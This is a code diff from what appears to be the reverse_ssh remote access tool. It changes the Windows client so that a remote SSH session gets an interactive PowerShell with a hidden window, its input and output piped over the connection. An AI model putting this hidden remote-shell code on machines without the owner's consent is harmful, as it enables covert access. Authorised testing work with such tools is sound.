@@ -3,11 +3,10 @@ package client
 
 import (
 	"fmt"
+	"io"
 	"os/exec"
 	"syscall"
 
-	"github.com/NHAS/reverse_ssh/internal"
-	"github.com/NHAS/reverse_ssh/internal/server/terminal"
 	"github.com/NHAS/reverse_ssh/internal/server/users"
 	"github.com/NHAS/reverse_ssh/pkg/logger"
 	"golang.org/x/crypto/ssh"
@@ -25,30 +24,93 @@ func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger
 	}
 	defer connection.Close()
 
-	term := terminal.NewTerminal(connection, "windows >")
 	go func() {
 		defer connection.Close()
 
-		for {
+		cmd := exec.Command("powershell.exe")
+		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
-			order, err := term.ReadLine()
-			if nil != err {
-				return
-			}
-
-			cmd := exec.Command("cmd.exe", "/C", order)
-			cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
-			out, err := cmd.CombinedOutput()
-			if err != nil {
-				out = []byte(fmt.Sprintf("Unable to execute command. Reason: %s\n", err))
-			}
-
-			_, err = fmt.Fprintf(connection, "%s", out)
-			if err != nil {
-				log.Warning("Unable to write: %s", err)
-				return
-			}
+		stdout, err := cmd.StdoutPipe()
+		if err != nil {
+			log.Warning("Unable to get stdout pipe: %s", err)
+			return
 		}
+
+		stderr, err := cmd.StderrPipe()
+		if err != nil {
+			log.Warning("Unable to get stderr pipe: %s", err)
+			return
+		}
+
+		go func() {
+			defer stderr.Close()
+			io.Copy(connection, stderr)
+		}()
+
+		go func() {
+			defer stdout.Close()
+
+			buff := make([]byte, 1024)
+			for {
+				n, _ := stdout.Read(buff)
+
+				_, err = connection.Write(buff[:n])
+				if err != nil {
+					log.Warning("Writing to connection failed: %s", err)
+					return
+				}
+			}
+		}()
+
+		stdin, err := cmd.StdinPipe()
+		if err != nil {
+			log.Warning("Unable to get stdin pipe: %s", err)
+
+			return
+		}
+
+		go func() {
+			defer stdin.Close()
+
+			buff := make([]byte, 1)
+			for {
+
+				_, err := connection.Read(buff)
+
+				if err != nil {
+					log.Warning("Reading from connection failed: %s", err)
+					return
+				}
+
+				fmt.Println(buff, string(buff))
+
+				if buff[0] == 127 {
+					stdin.Write([]byte{8, 0})
+					connection.Write(buff)
+					continue
+				}
+
+				connection.Write(buff)
+
+				if buff[0] == 13 {
+					stdin.Write([]byte{13, 10})
+					continue
+				}
+
+				_, err = stdin.Write(buff)
+				if err != nil {
+					log.Warning("Writing to stdin failed: %s", err)
+					return
+				}
+			}
+		}()
+
+		err = cmd.Run()
+		if err != nil {
+			log.Warning("Run returned an error: %s", err)
+			return
+		}
+
 	}()
 
 	for req := range requests {
@@ -58,10 +120,6 @@ func shellChannel(user *users.User, newChannel ssh.NewChannel, log logger.Logger
 			// We only accept the default shell
 			// (i.e. no command in the Payload)
 			req.Reply(len(req.Payload) == 0, nil)
-
-		case "window-change":
-			w, h := internal.ParseDims(req.Payload)
-			term.SetSize(int(w), int(h))
 
 		case "pty-req":
 			req.Reply(true, nil)
